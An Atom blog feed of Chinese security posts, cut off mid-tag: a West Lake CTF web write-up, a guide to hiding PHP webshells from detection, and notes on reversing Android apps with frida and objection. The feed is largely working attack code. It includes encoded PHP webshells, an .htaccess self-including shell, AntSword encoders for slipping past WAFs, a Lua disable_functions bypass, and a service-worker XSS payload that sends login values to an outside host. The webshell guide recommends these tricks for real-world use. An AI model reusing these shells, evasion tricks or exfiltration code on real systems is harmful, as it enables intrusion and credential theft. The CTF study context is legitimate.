    <link href="http://example.com/2020/10/09/%E8%A5%BF%E6%B9%96%E4%B8%A2%E8%84%B8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://example.com/2020/10/09/%E8%A5%BF%E6%B9%96%E4%B8%A2%E8%84%B8%E5%A4%A7%E8%B5%9B/</id>
    <published>2020-10-09T12:57:56.000Z</published>
    <updated>2020-10-16T03:42:11.051Z</updated>
    
    <content type="html"><![CDATA[<h2 id="西湖挑战杯WEB赛后总结"><a href="#西湖挑战杯WEB赛后总结" class="headerlink" title="西湖挑战杯WEB赛后总结"></a>西湖挑战杯WEB赛后总结</h2><h3 id="一、easyjson"><a href="#一、easyjson" class="headerlink" title="一、easyjson"></a>一、easyjson</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1621975/1602143338592-54ca3431-8858-49e9-8b7f-a964669ff4e0.png"></p><p>这是题目一打开的模样，像极了爱情，我感觉我好像又可以了。</p><p>wp1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xff设置ip 获取目录</span><br><span class="line">filename&#x3D;index.php可过check</span><br><span class="line">关键代码转unicode，然后进行getshell(具体见博客GETshell大法)</span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;&lt;?\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b?&gt;&quot;&#125;</span><br></pre></td></tr></table></figure><p>这道题不亏是easyjson，但是这个还有一个解法2</p><p>wp2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过unciode绕过写入htaccess的自包含木马php_value auto_prepend_fi\le .htaccess#&lt;?php eval($_POST[1])?&gt;# \ 然后注释下一行，然后getshell，readflag</span><br></pre></td></tr></table></figure><p>这里既然提到了文件包含，就不得不深深地探究一波这个神秘的文件<code>.htaccess</code>详情看另外一篇文章</p><h3 id="二、NewUpload"><a href="#二、NewUpload" class="headerlink" title="二、NewUpload"></a>二、NewUpload</h3><p>因为我在后续的复现过程中，并没有成功地getshell，所以我就简单利用一下大佬的原话对这里进行回复</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">换行+一个图片文件头就可以shell，至于怎么蚁剑怎么连上去，自己随便写一个编码器(如下)，然后流量倒到burp，全局修改一下ua</span><br></pre></td></tr></table></figure><p><img src="https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/1.png" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;10&#x2F;08 11:54:20</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(2)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString(&#39;base64&#39;);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line">  data[pwd] &#x3D; data[randomID];</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后用蚂蚁进行链接就可以成功地getshell。这里同时我们也可以扩展一下，在我们的实际运用中，也可以将一些编码的函数在php马儿中打出来，这样我们在实际使用这些马儿的时候，将传输的数据进行编码，然后在马儿中进行编码就可以简单地绕过waf。</p><p>最后这道题的实际思路如下:</p><p>经过百度，宝塔的实际waf是用lua脚本写的，这一点在<a href="https://blog.csdn.net/zhuxiongyin/article/details/98174377%E8%BF%99%E4%B8%AA%E6%96%87%E7%AB%A0%E4%B8%AD%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%BF%99%E4%B8%AAapache%E7%8E%AF%E5%A2%83%E5%BF%85%E5%AE%9A%E6%94%AF%E6%8C%81lua%E6%A8%A1%E5%9D%97%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%88%E7%AE%80%E5%8D%95%E5%9C%B0%E7%BB%95%E8%BF%87PHP%E7%9A%84disfunc%E7%9A%84%E9%99%90%E5%88%B6%E5%92%8C%E4%BB%A5%E5%8F%8Aopen_dir%E7%9A%84%E9%99%90%E5%88%B6%EF%BC%8C%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%80%E4%B8%AAlua%E8%84%9A%E6%9C%AC%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87">https://blog.csdn.net/zhuxiongyin/article/details/98174377这个文章中就可以知道，所以我们这个apache环境必定支持lua模块，这样我们就可以很简单地绕过PHP的disfunc的限制和以及open_dir的限制，简单的一个lua脚本即可绕过</a></p><p>exp如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">require &quot;string&quot;</span><br><span class="line"></span><br><span class="line">--[[</span><br><span class="line">     This is the default method name for Lua handlers, see the optional</span><br><span class="line">     function-name in the LuaMapHandler directive to choose a different</span><br><span class="line">     entry point.</span><br><span class="line">--]]</span><br><span class="line">function handle(r)</span><br><span class="line">    r.content_type &#x3D; &quot;text&#x2F;plain&quot;</span><br><span class="line">    r:puts(&quot;Hello Lua World!\n&quot;)</span><br><span class="line">    local t &#x3D; io.popen(&#39;&#x2F;readflag&#39;)</span><br><span class="line">    local a &#x3D; t:read(&quot;*all&quot;)</span><br><span class="line">    r:puts(a)</span><br><span class="line">    if r.method &#x3D;&#x3D; &#39;GET&#39; then</span><br><span class="line">        for k, v in pairs( r:parseargs() ) do</span><br><span class="line">            r:puts( string.format(&quot;%s: %s\n&quot;, k, v) )</span><br><span class="line">        end</span><br><span class="line">    else</span><br><span class="line">        r:puts(&quot;Unsupported HTTP method &quot; .. r.method)</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当然还有强大的wp2：攻击php-fpm</p><blockquote><p><a href="https://www.yuque.com/docs/share/ecb03c8b-300a-4146-9d30-3ce396a7bb1d#">https://www.yuque.com/docs/share/ecb03c8b-300a-4146-9d30-3ce396a7bb1d?#</a></p><p><a href="https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/#more">https://wulidecade.cn/2020/10/08/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web-wp/#more</a></p></blockquote><p>下面开始直接打，相关绕过方法，查看其他文档</p><p>首先上传shell，先链接蚁剑（可参考Getshell大法文章)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ï¿½ï¿½ [.ShellClassInfo] LocalizedResourceName&#x3D;@%SystemRoot%\system32\shell32.dll,-21770 IconResource&#x3D;%SystemRoot%\system32\imageres.dll,-112 IconFile&#x3D;%SystemRoot%\system32\shell32.dll IconIndex&#x3D;-235</span><br><span class="line">&lt;?php</span><br><span class="line">@eval(urldecode(urldecode(urldecode($_POST[&#39;aa&#39;]))));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后配置对应的编码器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * php::base64编码器</span><br><span class="line"> * Create at: 2020&#x2F;10&#x2F;12 17:16:57</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#39;use strict&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">* @param  &#123;String&#125; pwd   连接密码</span><br><span class="line">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span><br><span class="line">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span><br><span class="line">*&#x2F;</span><br><span class="line">module.exports &#x3D; (pwd, data, ext&#x3D;&#123;&#125;) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ##########    请在下方编写你自己的代码   ###################</span><br><span class="line">  &#x2F;&#x2F; 以下代码为 PHP Base64 样例</span><br><span class="line">    function urlencode(e, r) &#123;</span><br><span class="line">            return ++r ? &quot;%&quot; + ([10] + e.charCodeAt().toString(16)).slice(-2) :</span><br><span class="line">            decodeURI(encodeURIComponent(e)).replace(&#x2F;[^]&#x2F;g, urlencode)</span><br><span class="line">        &#125;</span><br><span class="line">  &#x2F;&#x2F; 生成一个随机变量名</span><br><span class="line">  let randomID &#x3D; &#96;_0x$&#123;Math.random().toString(16).substr(2)&#125;&#96;;</span><br><span class="line">  &#x2F;&#x2F; 原有的 payload 在 data[&#39;_&#39;]中</span><br><span class="line">  &#x2F;&#x2F; 取出来之后，转为 base64 编码并放入 randomID key 下</span><br><span class="line">  data[randomID] &#x3D; Buffer.from(data[&#39;_&#39;]).toString();</span><br><span class="line">  data[pwd]&#x3D;urlencode(urlencode(data[randomID]));</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; ##########    请在上方编写你自己的代码   ###################</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; 删除 _ 原有的payload</span><br><span class="line">  delete data[&#39;_&#39;];</span><br><span class="line">  delete data[randomID];</span><br><span class="line">  &#x2F;&#x2F; 返回编码器处理后的 payload 数组</span><br><span class="line">  return data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后进行链接</p><p><img src="https://i.loli.net/2020/10/13/tZ5Ivf8cB9ghW6j.png"></p><p><img src="https://i.loli.net/2020/10/13/PGwhDXiAzanNxKl.png"></p><p><img src="https://i.loli.net/2020/10/13/HwRuAVvUSagdM3N.png"></p><p>现在点击链接就可以连接成功。</p><p>再添加这样一条数据</p><p><img src="https://i.loli.net/2020/10/13/m4NncZpMir3YJOF.png"></p><p>注意后面的php文件名，然后我们用刚才第一条数据进行绕过disfunc。（这里省略了一步查找sock，就是做题常识了）。这里我就直接给出来了<code>/tmp/php-cgi-74.sock</code></p><p>如下图配置</p><p><img src="https://i.loli.net/2020/10/13/L6iN3cxazEBWXKQ.png"></p><p>把地址复制好，然后一直打。我一把嗦了</p><p><img src="https://i.loli.net/2020/10/13/q7TiHIRFcoD1P9k.png"></p><p>然后打开刚才那个链接，打开虚拟终端，执行命令</p><p><img src="https://i.loli.net/2020/10/13/GJmXd2ROsNYqrou.png"></p><p>注意有效期只有一分钟，没有干到时间就要重打，然后就是这里特别容易因为网络原因而打失败，建议大家多打几次，因为环境基本上都是满足的，一般是不应该出现打不通的情况的。</p><p>这样就是时间过了</p><p><img src="https://i.loli.net/2020/10/13/if7vo2clgp5EZGJ.png"></p><h2 id="三、HardXss"><a href="#三、HardXss" class="headerlink" title="三、HardXss"></a>三、HardXss</h2><p>大致理解的原理如下:</p><p>观察源代码找到xss注入点，然后引用恶意的js代码进行xss注入，但是这道题的考察点不知道大佬们是怎么直接想到使用windows sever的api的这种骚操作的，我只会说一句，太骚了。</p><p>参考链接：<a href="https://xz.aliyun.com/t/3228">https://xz.aliyun.com/t/3228</a></p><p>参考链接：<a href="https://120.25.156.28/posts/1.html">https://120.25.156.28/posts/1.html</a></p><p>大概的概括就是 某个域利用 xxxx/aaa.js 注册了一个service worker之后 xxxx/目录的所有请求 都可以被aaa.js中的代码劫持和控制响应wtf? 还是持久化触发的，注册完以后 注册页面可以关闭。在service worker整个存活期间（很久很久） 页面都一直可以被劫持<br>但是注册service worker 也有很多苛刻的条件（为了安全）。</p><p>条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">存在有缺陷的 JSONP 接口</span><br><span class="line">JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</span><br><span class="line">JSONP 返回的 Content-Type 必须是 JS 类型</span><br><span class="line">存在 XSS 的页面</span><br></pre></td></tr></table></figure><p><strong>JSONP 返回的 Content-Type 必须是 JS 类型</strong>可能这是突破口</p><p>然后绕过js代码长度限制的方法就是引入外部的js：<code>callback=importScripts(&#39;//xlcxss.sinaapp.com/xss/sw.js&#39;);</code></p><p>大致解题流程如下:</p><p>1.查看页面源代码，找到题目的突破口</p><p>2.本题的思路逻辑是：在登陆界面存在着xss注入，通过在这个界面的<code>document.domain</code>和jsonp来进行跨域操作，来在本地先进行对请求的hook，抓取请求中的账户名和密码（这个题是通过get请求进行验证的），在这里完成payload的构造后，再去向站长提交问题，注意这个URL的正确提交，后面带上callback进行xss注入，然后爆破验证码就可以了，最后查看账号密码进行登陆</p><p>3.大骂一下啊，现在网上的alji免费xss平台，做的太拉垮，但是谁叫我没有vps呢？</p><p>下面贴上代码，使用的是xs.sb平台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">这是操作文件</span><br><span class="line">self.addEventListener(&#39;fetch&#39;, function (event) &#123;</span><br><span class="line">        console.log(event.request);</span><br><span class="line">        event.respondWith(</span><br><span class="line">        caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        return requestBackend(event);</span><br><span class="line">        &#125;)</span><br><span class="line">        )</span><br><span class="line">   &#125;);</span><br><span class="line">function requestBackend(event)&#123;</span><br><span class="line">        var url &#x3D; event.request.clone();</span><br><span class="line">        console.log(url);</span><br><span class="line">        return new Response(&quot;&lt;script&gt;var a &#x3D;location.search; a &#x3D;a.replace(&#39;?&#39;,&#39;&#39;);a&#x3D;a.replace(&#39;&amp;&#39;,&#39;&#39;);var b&#x3D;a.substring(0,a[&#39;length&#39;]&#x2F;2);var c&#x3D;a.substring(a[&#39;length&#39;]&#x2F;2,a[&#39;length&#39;]);location&#x3D;&#39;https:&#x2F;&#x2F;xsshs.cn&#x2F;xss.php?do&#x3D;api&amp;id&#x3D;pNII&amp;uin&#x3D;&#39;+b+&#39;&amp;skey&#x3D;&#39;+c;&lt;&#x2F;script&gt;&quot;, &#123;headers: &#123; &#39;Content-Type&#39;: &#39;text&#x2F;html&#39; &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">入口文件</span><br><span class="line">document.domain &#x3D; &quot;hardxss.xhlj.wetolink.com&quot;;</span><br><span class="line">var iff &#x3D; document.createElement(&#39;iframe&#39;);</span><br><span class="line">iff.src &#x3D; &#39;https:&#x2F;&#x2F;auth.hardxss.xhlj.wetolink.com&#x2F;&#39;;</span><br><span class="line">iff.addEventListener(&quot;load&quot;, function()&#123; iffLoadover(); &#125;);</span><br><span class="line">document.body.appendChild(iff);</span><br><span class="line">exp &#x3D; &#96;navigator.serviceWorker.register(&quot;&#x2F;api&#x2F;loginStatus?callback&#x3D;self.importScripts(&#39;&#x2F;&#x2F;xs.sb&#x2F;l6s9&#39;)&#x2F;&#x2F;&quot;)&#96;;</span><br><span class="line">function iffLoadover()&#123;</span><br><span class="line">    iff.contentWindow.eval(exp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5爆破文件就不上传了，感谢赵总，爱了爱了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;西湖挑战杯WEB赛后总结&quot;&gt;&lt;a href=&quot;#西湖挑战杯WEB赛后总结&quot; class=&quot;headerlink&quot; title=&quot;西湖挑战杯WEB赛后总结&quot;&gt;&lt;/a&gt;西湖挑战杯WEB赛后总结&lt;/h2&gt;&lt;h3 id=&quot;一、easyjson&quot;&gt;&lt;a href=&quot;#一、e</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>GetShell</title>
    <link href="http://example.com/2020/10/09/GetShell/"/>
    <id>http://example.com/2020/10/09/GetShell/</id>
    <published>2020-10-09T12:13:07.000Z</published>
    <updated>2020-10-13T11:44:53.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GetShell-常用免杀大法"><a href="#GetShell-常用免杀大法" class="headerlink" title="GetShell 常用免杀大法"></a>GetShell 常用免杀大法</h1><h2 id="一、编码大法"><a href="#一、编码大法" class="headerlink" title="一、编码大法"></a>一、编码大法</h2><p>(1).一句话马子本身采用编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原文：&lt;?php @eval($_GET(a)):?&gt;</span><br><span class="line">转码后：在提交的post的时候可以直接使用\u0026\u006c\u0074\u003b\u003f\u0070\u0068\u0070\u0020\u0040\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0047\u0045\u0054\u0028\u0061\u0029\u0029\u003a\u003f\u0026\u0067\u0074\u003b</span><br></pre></td></tr></table></figure><p>(2)，蚁剑链接时编码</p><p>蚁剑在getshell的时候，可以选取使用编码器和解码器，这个时候可以使用自己的独家编码器进行实际的操作，并进行花式绕过waf。蚁剑的编码器是采用的js语言进行编写的，简易操作。</p><h2 id="二、花招大法"><a href="#二、花招大法" class="headerlink" title="二、花招大法"></a>二、花招大法</h2><p>(1).通过getallheaders()来获取shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo 1;</span><br><span class="line">print(pos(getallheaders()));</span><br><span class="line">eval(pos(getallheaders()));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/11/XsqMTPCSbgWezav.png"></p><p>这样配置，密码是1；</p><p>(2)同理可以使用sessionid来操作，同时搭配编码器，这就很舒服了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval(hex2bin(session_id(session_start())));?&gt;</span><br></pre></td></tr></table></figure><p>这里的hex2bin可以改为base64</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GetShell-常用免杀大法&quot;&gt;&lt;a href=&quot;#GetShell-常用免杀大法&quot; class=&quot;headerlink&quot; title=&quot;GetShell 常用免杀大法&quot;&gt;&lt;/a&gt;GetShell 常用免杀大法&lt;/h1&gt;&lt;h2 id=&quot;一、编码大法&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>安卓之旅-3</title>
    <link href="http://example.com/2020/10/09/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-3/"/>
    <id>http://example.com/2020/10/09/%E5%AE%89%E5%8D%93%E4%B9%8B%E6%97%85-3/</id>
    <published>2020-10-09T02:34:19.000Z</published>
    <updated>2020-10-24T08:59:21.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安卓之旅-3"><a href="#安卓之旅-3" class="headerlink" title="安卓之旅-3"></a>安卓之旅-3</h2><h3 id="一、解决软件会自动断掉USB链接的设置"><a href="#一、解决软件会自动断掉USB链接的设置" class="headerlink" title="一、解决软件会自动断掉USB链接的设置"></a>一、解决软件会自动断掉USB链接的设置</h3><p>在手机上使用termux,开启frida，监听0.0.0.0:8888端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frida-** -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><p>就会在0.0.0.0的端口上进行监听，这里的0.0.0.0是通过该设备的所有流量都会被劫持，而127.0.0.1只有本地机器发出的流量才会被劫持。然后，在电脑上开启objection</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -N -h ip -p 端口 -g 包名 explore</span><br></pre></td></tr></table></figure><p>使用下面的命令进行查看报名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -ps -H ip:端口 | grep shimeng</span><br></pre></td></tr></table></figure><p>-h是适应网络链接，-u是使用usb链接</p><p>查看监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -tuulp | grep frida</span><br><span class="line">lsof -p 2349 |grep TCP</span><br><span class="line">netstat -aple | grep frida</span><br></pre></td></tr></table></figure><h2 id="二、破解第一步"><a href="#二、破解第一步" class="headerlink" title="二、破解第一步"></a>二、破解第一步</h2><p>1.我要确定点击解锁的第一步在哪里，就是要把类hook上，要<code>trace</code></p><p>然后我们发现这个类有点问题，为什么一直在那里自己启动，然后一直跑，我们要看看他的方法了。</p><p>然后知道了他的源码是音量的增加。</p><p>2.然后输入密码试一下，来trace一下，然后再静态分析一波，继续深入，突突他</p><h2 id="三、自动化动态分析和快速定位"><a href="#三、自动化动态分析和快速定位" class="headerlink" title="三、自动化动态分析和快速定位"></a>三、自动化动态分析和快速定位</h2><p>先来准备一波工具，首先是工具解包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;root&#x2F;Desktop&#x2F;android-studio&#x2F;jre&#x2F;bin&#x2F;jarsigner &#x2F;usr&#x2F;bin</span><br><span class="line">ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;build-tools&#x2F;30.0.1&#x2F;aapt &#x2F;usr&#x2F;bin</span><br><span class="line">ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;build-tools&#x2F;30.0.1&#x2F;aapt2 &#x2F;usr&#x2F;bin</span><br><span class="line">ln -s &#x2F;root&#x2F;Android&#x2F;Sdk&#x2F;platform-tools&#x2F;adb &#x2F;usr&#x2F;bin</span><br></pre></td></tr></table></figure><p>创建一下细节</p><p>安装apktools</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.Download Linux wrapper script (Right click, Save Link As apktool)</span><br><span class="line">2.Download apktool-2 (find newest here)</span><br><span class="line">3.Rename downloaded jar to apktool.jar</span><br><span class="line">4.Move both files (apktool.jar &amp; apktool) to &#x2F;usr&#x2F;local&#x2F;bin (root needed)</span><br><span class="line">5.Make sure both files are executable (chmod +x)</span><br><span class="line">6.Try running apktool via cli</span><br></pre></td></tr></table></figure><p>objection  patchapk的参数设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">objection patchapk -s fulao2.apk -a x86</span><br><span class="line">来对x86架构的来干他</span><br><span class="line">help命令使用方法照旧</span><br><span class="line">memory list exports lib.so 列举该so文件的所有导出函数</span><br><span class="line">android heap search instances 搜索tostring 在安卓的堆上进行搜索</span><br><span class="line">android heap execute  + hashid + 函数 --return-string 执行这个handler的函数，获得返回值 最直接的主动调用</span><br><span class="line">android heap evaluate + hashid  然后输出 console.log(clazz.getPixel(传入参数)) 就可以了</span><br><span class="line"></span><br><span class="line">控制四大组件</span><br><span class="line">android hooking +方法+四大组件</span><br><span class="line">android intent launch_activity + activity 进入四大组件</span><br><span class="line">android hooking list services 列举广播</span><br><span class="line">android hooking watch </span><br><span class="line">jobs list 查看当前被hook的函数</span><br><span class="line">jobs kill 杀掉任务</span><br><span class="line"></span><br><span class="line">objection 继承了flask 可以从电脑向手机中传入脚本进行跑（详情看肉丝姐姐的知识星球)</span><br><span class="line">objection -g EXPLORE --enable-api 打开flask 然后使用他提供的api接口进行继续的操作就可以实现想要的功能了。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="四、真实app实操（去强制升级）"><a href="#四、真实app实操（去强制升级）" class="headerlink" title="四、真实app实操（去强制升级）"></a>四、真实app实操（去强制升级）</h2><p>Dalvik虚拟机就是一个java代码的虚拟机，在本地的as路径下都有d8和dx，以及各种文件都会在本地进行生成</p><p>参考链接:<a href="https://www.jianshu.com/p/6bdbbab73705">https://www.jianshu.com/p/6bdbbab73705</a></p><p>首先来一个app实操(去升级)</p><p>1.<code>我们想一想弹出这个升级窗口是如何开发的</code></p><p>参考链接：<a href="https://www.jianshu.com/p/18e1f518c625">https://www.jianshu.com/p/18e1f518c625</a></p><p>2.现在要寻找他有三个办法</p><p>(1).字符串搜索大法</p><p>(2),顺着上面的思路进行hook</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android heap search isntance + 类名</span><br></pre></td></tr></table></figure><p>使用插件</p><figure 